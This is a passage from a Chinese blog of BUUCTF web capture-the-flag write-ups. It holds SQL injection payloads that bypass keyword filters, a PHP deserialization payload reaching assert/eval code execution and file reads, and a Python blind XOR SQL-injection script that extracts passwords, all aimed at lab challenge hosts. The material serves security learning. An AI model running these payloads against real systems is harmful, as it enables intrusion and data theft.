class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ac&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ac&#x27;</span>] === <span class="string">&#x27;add&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;number&#x27;</span>] &gt;= <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;申请的广告条数已达上限，请先清理&lt;/font&gt;&quot;</span>);</span><br><span class="line">		<span class="variable">$title</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]));</span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">		<span class="variable">$sql_query</span> = <span class="string">&quot;select * from ads where title = &#x27;<span class="subst">$title</span>&#x27; limit 0,1&quot;</span>;</span><br><span class="line">		<span class="variable">$sql_insert</span> = <span class="string">&quot;insert into ads (title, content, belong) values (&#x27;<span class="subst">$title</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i&quot;</span>, <span class="variable">$title</span>))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;标题含有敏感词汇&lt;/font&gt;&quot;</span>);</span><br><span class="line">		<span class="variable">$result_query</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result_query</span>-&gt;num_rows)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;广告名称已存在&lt;/font&gt;&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$result_insert</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_insert</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$result_insert</span>)&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;已发送申请&#x27;);window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">exit</span>();</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;申请失败&lt;/font&gt;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面还是要想办法绕过对<code>information_schema.TABLES</code>的过滤</p>
<p><strong>使用<code>mysql.innodb_table_stats</code>来代替<code>information_schema.TABLES</code>查询表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022144419800-1667047819736154.png" alt="image-20221022144419800" style="zoom:67%;" />

<p><strong>但是无法知道<code>users</code>的列名,需要进行无列名查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022144915861.png" alt="image-20221022144915861" style="zoom:80%;" />







<br>

<hr>
<br>

<h1 id="反序列化-assert-eval-引入其他GET参数绕过过滤-ReadlezPHP"><a href="#反序列化-assert-eval-引入其他GET参数绕过过滤-ReadlezPHP" class="headerlink" title="[反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP"></a>[反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP</h1><p>进去之后网页默认没法右键菜单,所以抓包看一下源码</p>
<p>发现了一个<code>time.php</code>而且似乎还可以通过<code>GET</code>的<code>source</code>传参</p>
<img src="/images/buuctf-web/image-20221022154621834.png" alt="image-20221022154621834" style="zoom:80%;" />

<p>随便传一个,直接出了源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?source=2</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化题目:</p>
<p>利用点是第14行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $b($a);</span><br><span class="line">那么可以构造$b=system, $a=cat /flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;参数&#x27;;</span><br><span class="line">    public $b = &#x27;要执行的函数&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new HelloPhp();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>但是这里试了<code>system</code>,<code>exec</code>等都无法输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;cat /flag&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>尝试一个无害函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;s:2:&quot;pi&quot;;&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022160705759.png" alt="image-20221022160705759" style="zoom:80%;" />

<p><strong>考虑一下引入其他GET参数来执行命令.多次尝试,必须是<code>assert(eval(..)) </code> 这种形式才能成功执行</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;eval($_GET[1])&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在后面的命令中,<code>system</code>等函数仍然不能用,尝试半天<code>scandir</code>还能用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">输出:</span><br><span class="line">array(23) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(10) &quot;FIag_!S_it&quot; [4]=&gt; string(3) &quot;bin&quot; [5]=&gt; string(4) &quot;boot&quot; [6]=&gt; string(3) &quot;dev&quot; [7]=&gt; string(3) &quot;etc&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(3) &quot;sys&quot; [20]=&gt; string(3) &quot;tmp&quot; [21]=&gt; string(3) &quot;usr&quot; [22]=&gt; string(3) &quot;var&quot; &#125; 2022-10-22 08:34:24</span><br><span class="line"></span><br><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=echo file_get_contents(&quot;/FIag_!S_it&quot;);</span><br><span class="line">输出:</span><br><span class="line">NPUCTF&#123;this_is_not_a_fake_flag_but_true_flag&#125; 2022-10-22 08:36:09</span><br></pre></td></tr></table></figure>

<p>假的flag….</p>
<p>没想到flag在<code>phpinfo</code>中找到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022163859246-1667047819736155.png" alt="image-20221022163859246" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="基于异或运算的盲注-FinalSQL"><a href="#基于异或运算的盲注-FinalSQL" class="headerlink" title="[基于异或运算的盲注]FinalSQL"></a>[基于异或运算的盲注]FinalSQL</h1><img src="/images/buuctf-web/image-20221022173149594-1667047819736156.png" alt="image-20221022173149594" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022173232632.png" alt="image-20221022173232632" style="zoom:80%;" />

<p>存在过滤,这里应该是<code>or</code>,那么使用异或盲注来代替试试</p>
<p><strong><code>A^B</code>,AB如果相同则返回0,不同则返回1</strong></p>
<p>那么首先爆一下数据库名的长度试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search.php?id=1^(length(database())=3)#</span><br><span class="line">返回:NO! Not this! Click others~~~ (id=1时查到的内容) 说明(length(database())=3)的值不是1,所以是false</span><br><span class="line"></span><br><span class="line">search.php?id=1^(length(database())=4)# </span><br><span class="line">返回:error 这里报错了,推测查询了id=0,即(length(database())=4)返回了1,因此数据库名的长度为4</span><br></pre></td></tr></table></figure>

<p>后面爆具体名的话就不能一个一个试了,需要靠脚本了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search.php?id=1^(substr(database(),1,1)=&#x27;g&#x27;)#   error</span><br><span class="line">search.php?id=1^(substr(database(),1,1)=&#x27;f&#x27;)#   NO! Not this! Click others</span><br><span class="line">说明库名的第一个位置是g</span><br></pre></td></tr></table></figure>

<p>爆表名的过程中发现又触碰到了过滤词, 一开始以为只有<code>or</code>,遂把<code>information_schema</code>换成<code>mysql.innodb_table_stats</code></p>
<p>不对,好像没有过滤or😅</p>
<p>最后发现被过滤的是空格,尝试使用<code>/**/</code>代替无果, 改为使用括号来绕过:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名:F1naI1y,Flaaaaag</span><br><span class="line">F1naI1y的列名:id,username,password</span><br></pre></td></tr></table></figure>

<p>盲注脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://a01809ec-5fe8-45cc-96cc-3078c22fecbb.node4.buuoj.cn:81/search.php?id=1^&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>): <span class="comment">#爆库名</span></span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(): <span class="comment">#爆表名</span></span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=&#x27;geek&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>(): <span class="comment">#爆F1naI1y表的列名</span></span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(): <span class="comment">#爆F1naI1y表password字段的数据</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database_name(4)</span></span><br><span class="line"><span class="comment"># get_table_name()</span></span><br><span class="line"><span class="comment"># get_column_name()</span></span><br><span class="line">get_data() <span class="comment">#最后这个要跑好久...</span></span><br></pre></td></tr></table></figure>

















</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gswanx.github.io">1ustinianus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gswanx.github.io/post/2e610037.html">http://gswanx.github.io/post/2e610037.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gswanx.github.io" target="_blank">逃    避    現    實</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF-Web</a></div><div class="post_share"><div class="social-share" data-image="/img/headddd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/f7296425.html"><img class="prev-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web杂项</div></div></a></div><div class="next-post pull-right"><a href="/post/d0bdcf10.html"><img class="next-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux+Windows的安全事件响应清单</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ef088674.html" title="常用bypass（待更新）"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-17</div><div class="title">常用bypass（待更新）</div></div></a></div><div><a href="/post/aeaad0f.html" title="Apache的文件解析漏洞(特性)"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">Apache的文件解析漏洞(特性)</div></div></a></div><div><a href="/post/e3611a41.html" title="PHP伪协议"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">PHP伪协议</div></div></a></div><div><a href="/post/e40cde58.html" title="ctfshow刷题_web入门命令执行篇"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-24</div><div class="title">ctfshow刷题_web入门命令执行篇</div></div></a></div><div><a href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">buuctf_web部分刷题记录_PART4</div></div></a></div><div><a href="/post/94662ad7.html" title="SQL注入基础"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">SQL注入基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/headddd.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ustinianus</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Cf4y1d7Ez"><i class="iconfont icon-yu"></i><span>歇会</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:trajanin117@proton.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=308450602" target="_blank" title="Music"><i class="fas fa-music"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a 